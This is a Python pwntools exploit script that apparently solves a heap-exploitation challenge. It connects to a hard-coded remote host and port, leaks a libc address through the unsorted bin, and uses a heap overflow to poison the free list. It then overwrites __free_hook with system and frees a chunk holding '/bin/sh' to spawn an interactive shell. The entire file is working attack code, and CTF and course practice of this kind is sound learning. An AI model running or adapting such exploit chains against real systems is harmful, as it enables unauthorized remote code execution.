import os
import string
import struct
from itertools import chain
from typing import Any, Callable, Iterable, List

from pwn import *
from pwnlib.gdb import Gdb

binary = './chal'
context.binary = binary
context.terminal = ['tmux', 'splitw', '-h']
# context.arch = "amd64"
context.log_level = 'debug'

def flatten(items: Iterable) -> List[Any]:
    return list(chain.from_iterable(items))

def make_breakpoints(breakpoints: List[str]) -> List[str]:
    return list(map(lambda b: f'b* {b}', breakpoints))

def make_commands(args: List[str]) -> List[str]:
    return flatten(map(lambda a: [a], args))

breakpoints = [
    '0x555555555673', # main RET
    '0x5555555552b1', # menu RET 
]
print_statements = []
breakpoints = make_breakpoints(breakpoints)
commands = make_commands(breakpoints + print_statements)

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
bin_sh_offset = next(libc.search(b'/bin/sh\x00'))
system_offset = libc.symbols[b'system']
free_hook_offset = libc.symbols[b'__free_hook']

gdbscript = '''
continue
continue
''' + '\n'.join(commands)

# with gdb.debug(binary, aslr=False, api=True, gdbscript=gdbscript) as p:
#     p: process
#     p.gdb: Gdb

# with process(binary, aslr=False) as p:
with remote('128.238.62.254', 12346) as p:


    is_remote = isinstance(p, remote)
    is_debuggable = not is_remote

    def send_cmd(cmd):
        if type(cmd) == str:
            cmd = cmd.encode()
        elif type(cmd) == int:
            cmd = str(cmd).encode()

        p.sendlineafter(b'>', cmd)

    def add(size: int):
        send_cmd(1)
        p.sendlineafter(b'Size:\n', str(size).encode())

    def delete(idx: int):
        send_cmd(2)
        send_cmd(idx)

    def edit(idx: int, size: int, cmd: bytes):
        send_cmd(3)
        send_cmd(idx)
        p.sendlineafter(b'Size:\n', str(size).encode())
        p.sendlineafter(b'Content:\n', cmd)

    def show(idx: int) -> bytes:
        send_cmd(4)
        send_cmd(idx)
        p.recvuntil(b'Content:\n').decode()
        data = p.recvuntil(b'===').rstrip(b'===')
        log.info("Heap at idx %d: %s", idx, data)
        return data

    def exit():
        send_cmd(5)

    def wait():
        if is_debuggable:
            p.gdb.wait()

    if is_remote:
        p.recvuntil(b'Please input your NetID (something like abc123): ')
        p.sendline(b'nf2137')

    '''
    x/50xg 0x555555559290
    x/32xg &array
    '''

    SIZE = 0x20
    UNSORTED_BIN_SIZE = 0x418

    '''
    Leak LIBC
    '''
    add(UNSORTED_BIN_SIZE)
    add(SIZE)
    delete(0)
    add(UNSORTED_BIN_SIZE)

    arena_offset = 0x1ecbe0
    main_arena = u64(show(0)[:8])
    libc_base: int = main_arena - arena_offset

    log.info(f'Main Arena: {hex(main_arena)}')
    log.info(f'LIBC base: {hex(libc_base)}')

    free_hook: int = libc_base + free_hook_offset
    system: int = libc_base + system_offset
    bin_sh: int = libc_base + bin_sh_offset
    # '''
    # one_gadget /lib/x86_64-linux-gnu/libc.so.6

    # 0xe3afe execve("/bin/sh", r15, r12)
    # constraints:
    # [r15] == NULL || r15 == NULL
    # [r12] == NULL || r12 == NULL

    # 0xe3b01 execve("/bin/sh", r15, rdx)
    # constraints:
    # [r15] == NULL || r15 == NULL
    # [rdx] == NULL || rdx == NULL

    # 0xe3b04 execve("/bin/sh", rsi, rdx)
    # constraints:
    # [rsi] == NULL || rsi == NULL
    # [rdx] == NULL || rdx == NULL
    # '''
    # gadget: int = libc_base + 0xe3b04
    # log.info(f'gadget: {hex(gadget)}')

    log.info(f'free_hook: {hex(free_hook)}')
    log.info(f'system: {hex(system)}')
    log.info(f'bin_sh: {hex(bin_sh)}')

    delete(0)
    delete(1)

    '''
    Overwrite __free_hook --> system
    and call with /bin/sh
    '''
    add(SIZE) # This points after UNSORTED_BIN, so we just ignore it
    add(SIZE) # A
    add(SIZE) # B
    add(SIZE) # C

    delete(3) # C
    delete(2) # B

    overflow = b"\x00" * 8 * 5 + p64(0x31) + p64(free_hook)
    edit(1, 0x39, overflow) # Edit A, so that it overflows into B, and sets the FD to __free_hook
    edit(1, SIZE, b"A" * 8) # Edit A back to default size

    add(SIZE) # Pop B out
    edit(2, SIZE, b'/bin/sh\0') # Update B to /bin/sh

    add(SIZE) # Pop C out which is now the __free_hook address
    edit(3, SIZE, p64(system)) # Point C (__free_hook) to system

    delete(2) # Delete B to invoke __free_hook (system) with /bin/sh

    p.interactive()

